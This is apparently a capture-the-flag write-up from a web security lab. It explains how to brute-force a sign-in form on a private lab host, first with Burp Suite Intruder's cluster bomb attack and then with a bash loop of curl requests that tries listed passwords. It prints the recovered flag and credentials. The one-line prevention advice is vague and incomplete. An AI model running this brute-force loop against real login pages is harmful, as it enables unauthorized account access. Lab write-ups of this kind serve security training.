``` bash

VUNERABILITY__
    => GET request on form submission.
    => we just going try a different combinations of password and logins  usign burp suite.


HOW?
    1 => use curl 
    2 => use BurpSuite or OWASP ZAP.

            ___BruteForce with BurpSuite__
            step 1) intercept '/?page=signin'
                 2) input dummy username and password and submit
                 3) intercept again.
                 4) get the Raw data from the request
                 5) send data to intruder
                 6) forward
                 7) go to intruder and select position
                 8) clear the predefined positions
                 9) modify payload positions
                 10) select cluster bomb attck type.
                 11) Payload set = 1, 2, account for both username and password.
                 12) specify a payload list
                 13) examine status-code and youre in.

                 flag : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b

                 username: emanana
                 password: shadow   ... hacks it.


                 of you simply : 

                 pass = (list of password and usernames emanana shadow root admin dragon)
                 for i in ${pass[@]}; do
	                curl -X POST "http://192.168.8.6/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
                done



PREVENTION__
    => server-side and client side validation.
```
